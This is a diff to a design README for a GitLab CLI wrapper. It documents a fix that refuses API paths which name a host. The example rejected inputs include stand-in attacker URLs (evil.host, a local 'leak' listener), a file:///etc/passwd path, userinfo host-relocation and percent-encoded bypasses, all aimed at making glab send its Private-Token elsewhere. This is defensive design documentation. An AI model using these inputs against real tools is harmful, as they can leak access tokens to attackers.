@@ -19,11 +19,32 @@ GitLab ops via the `glab` CLI. Replaces the 3-5 separate `glab` calls needed to 
 
 ### GET-only, and why that is the whole design
 
-`gl-api` sends `--method GET`, forwards no flag the caller typed, and refuses a path that is flag-shaped, contains whitespace, or is `graphql`. The refusal names the raw command instead of guessing: `glab api -X POST PATH -f key=value`.
+`gl-api` sends `--method GET`, forwards no flag the caller typed, and refuses a path that is flag-shaped, contains whitespace, names its own host, or is `graphql`. The refusal names the raw command instead of guessing: `glab api -X POST PATH -f key=value`.
 
 The method is **pinned rather than left to default**, and those are different claims. `glab api` switches to POST on its own as soon as a `-f`/`-F` is present, so "supertool passed no method" would not have meant "supertool sent a read". Pinning it makes the sentence true.
 
 A passthrough that accepted `-X POST` would not be a larger read op. It would be a write surface reachable from every alias, batch and worktree that can spell `gl-api`, with no validator, no rollback and no confirmation in front of it — which is the opposite of the arrangement the rest of the tool is built on: reads through supertool, writes through `glab`. The guarantee is about what supertool sends, not a claim that GitLab treats every GET as free of side effects.
+
+### A path may not name a host
+
+`glab api` accepts an absolute URL where it accepts a path, and attaches the instance's `Private-Token` header to it. So `gl-api:http://127.0.0.1:8765/leak` used to send a live GitLab personal access token to a host the *input* chose, render the listener's reply as an ordinary result and report `PASS` ([#1035](https://github.com/Digital-Process-Tools/claude-supertool/issues/1035)). A path is not always typed by the person running the op: it can arrive out of an issue body, an MR description or a CI job name, which this repo already treats as text a stranger wrote.
+
+The rule is an **allowlist of what a GitLab API path may contain**, not a denylist of schemes — a denylist is one new scheme, one casing and one encoder behind, permanently. Four structural facts are refused:
+
+| Refused | Example | Why |
+|---|---|---|
+| a scheme at the front | `http://evil.host/x`, `HtTpS://x`, `file:///etc/passwd`, `http:evil.host/x` | a scheme names a host; the `//` is optional and the casing is not lowercase |
+| `//` in the path portion | `//evil.host/x`, `//gitlab.com@evil.host/x` | an authority, not a path segment — and it is where a userinfo `@` relocates the host |
+| a backslash | `\\evil.host\x` | not a path separator here, and the parsers that disagree fold it into `/` |
+| anything outside `pchar` + `/` | a NUL, an escape sequence, `#`, `<` | a path has a character set; a byte outside it is a typo or a reach past the API path |
+
+All three structural checks run **again on the percent-decoded value**, so `http%3A%2F%2Fevil.host` and `%2F%2Fevil.host` do not get past the first pass wearing an encoder. Because nothing may name a host, every request resolves against the instance glab is configured for without supertool having to read glab's config to find out which one that is.
+
+**Refused, not sanitised**, for the same reason `-X POST` is refused: stripping the scheme would send *a* request, and the answer would read as the one you asked for. The refusal quotes the value and names which of the four facts it tripped.
+
+Real paths are unaffected, and pinned as such: glab `:placeholder` paths, a leading `/`, percent-encoded group paths (`projects/group%2Fsub%2Fproj/issues`), query strings including GitLab's bracket filters (`?not[labels]=bug`), ISO timestamps with their colons, and npm scoped packages (`packages/npm/@scope/name`).
+
+**What is outside this guarantee.** A GitLab-hosted path that answers with a redirect — or a `Link` header followed under `:full` — is followed by glab, not by supertool, and Go's client strips `Authorization` across hosts but not a custom `Private-Token`. The rule is about the host supertool asks for, not about every host glab may end up talking to.
 
 ### A full page is not a complete list
 
